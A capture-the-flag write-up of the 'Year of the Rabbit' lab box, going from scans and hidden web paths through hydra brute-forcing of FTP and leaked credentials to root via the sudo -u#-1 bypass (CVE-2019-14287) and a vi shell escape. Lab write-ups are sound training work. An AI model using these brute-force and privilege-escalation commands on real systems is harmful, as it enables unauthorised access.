# Year of the Rabbit - Linux
---

**IP may change all over the document as this box took several tries**

## Enumeration

### Nmap 
 
 + `nmap -sV 10.10.236.151 -oN nmap-intial`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

+ NSE: `nmap -sC -oN nmap-nse-scan -v 10.10.236.151`

```bash
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp   open     http
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Debian Default Page: It works
3351/tcp filtered btrieve
8093/tcp filtered unknown
9001/tcp filtered tor-orport
9415/tcp filtered unknown
```

### Gobuster: `gobuster dir -u http://10.10.236.151/ -w common.txt -o gobuster-scan`

```bash
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.236.151/assets/]
/index.html           (Status: 200) [Size: 7853]                                  
/server-status        (Status: 403) [Size: 278]                                   
```

### Manual enumeration

So inside */assets/* we have two files listed. Checking the .css file first, we get the following message

```
Nice to see someone checking the stylesheets.
Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

Now visiting *sup3r_s3cr3t_fl4g.php* we are greeted by an alert javascript message. Taking a look at the source code of the current page we can see: 

+ Redirects to  https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1 if javascript is allowed on page.

+ Media content played from */assets* if javascript not allowed.

At any case it wants us to have a look at the video. Moreover tryhackme page had the following in description `(Please ensure your volume is turned up!)`.

*(NOPE ITS A RABBIT HOLE. I JUST DUG IT DEEPER FOR NO REASON)* 

*After spending a lot of time to go through each comment in the youtube on the video, checking the lyrics of the video, even listening the local video on the server (by just playing it from assets/). NOTHING.*

Then just opening `burp` and checking if there is anything that I am missing.. and there it was the intermediate php script that ran every time I visited *sup3r_s3cr3t_fl4g.php (Requires enabling of intercept for request option in proxy tab)*.

```bash
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.236.151
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Got some hidden directory */WExYY2Cv-qU*. Once inside the directory just download the file present there.

### Checking the image

Executing `exiftool` reveals something:

```bash
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 512
Image Height                    : 512
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 512x512
Megapixels                      : 0.262
```

**Trailer data after PNG IEND chunk**.

In order to check the trailer data the best way I know is opening the image in `vim`. The same can be done by converting the image to a hexdump using `xxd image_file > hexdump`. It can be found at approx address *00073af0*.

Using `tail` to extract message: 

```bash
tail -n84 image_file > hidden_msg
```

The message gives a username and bunch of passwords. `Hydra` time.

### FTP 

Let's get the password listed in a seperate file

```bash
tail -n82 hidden_msg > password_list
```

Using `hydra` for brute forcing the password.

```bash
hydra -l ftpuser -P password_list ftp://10.10.236.151
```

Got the password! Just use the password obtained and login using ftp and get the file there.

Apparently the file seems like a code of sorts. After searching the internet finally came across something called *brainfuck*. There is an [online decoder](https://www.dcode.fr/brainfuck-language) for it. Decoding gives a username and a password. `SSH` time.

## User.txt

Using the creds login in machine and we are greeted by the following message:

```bash
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

There is not a user.txt file in the current directory so maybe other user has it. Lets search that *s3cr3t hiding place*. `Find` time.

```bash
$find / -name s3cr3t 2>/dev/null 
/usr/games/s3cr3t
```
Inside we have a hidden file which was suppossed to be for the other user only.... but its world readable. 

Contents of *.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!*

```bash
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

Got the password for other account. Using `su` for switching the account. There it is *user.txt*. Just `cat` the file to get the flag.

## Root.txt

Executing `sudo -l` we get the following

```bash
sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Checking [gftobins](https://gtfobins.github.io/gtfobins/vi/) for an appropriate method

```bash
vi
:set shell=/bin/sh
:shell
```

Hmm executing `sudo -u root /usr/bin/vi /home/gwendoline/user.txt` results in

```bash
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi /home/gwendoline/user.txt' as root on year-of-the-rabbit.
```

But it says I can execute when checked with `sudo -l`. So after a lot of trial and error I finally gave up and started reading on *sudoers* file.

So according to `sudo -l` I can execute `/usr/bin/vi /home/gwendoline/user.txt` as any user except *root*. So the thing I want most is out of my reach....awesome!

*I later found this configuration is actually related to a CVE (ref:https://www.exploit-db.com/exploits/47502)*

So just following the steps in comments of the [exploit](https://www.exploit-db.com/exploits/47502) this is what we get:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

This opens the file as root. Now just doing the following the [gftobins](https://gtfobins.github.io/gtfobins/vi/) we get our shell.

```bash
:set shell=/bin/sh
:shell
```

Just `cat` the */root/root.txt* and we have our root flag.
